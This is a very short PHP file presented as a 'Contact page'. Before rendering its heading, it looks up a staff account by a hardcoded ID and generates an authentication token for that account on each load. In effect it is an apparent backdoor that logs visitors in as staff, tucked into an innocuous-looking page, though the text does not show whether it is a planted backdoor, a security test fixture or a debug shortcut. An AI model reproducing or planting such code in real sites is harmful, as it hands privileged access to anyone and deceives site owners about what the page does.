<?php

$user = \app\src\model\Users\StaffUser::find_by_id("51122384");
\app\src\model\Auth\Auth::generate_token($user, "true"); ?>

<h1>Contact page</h1>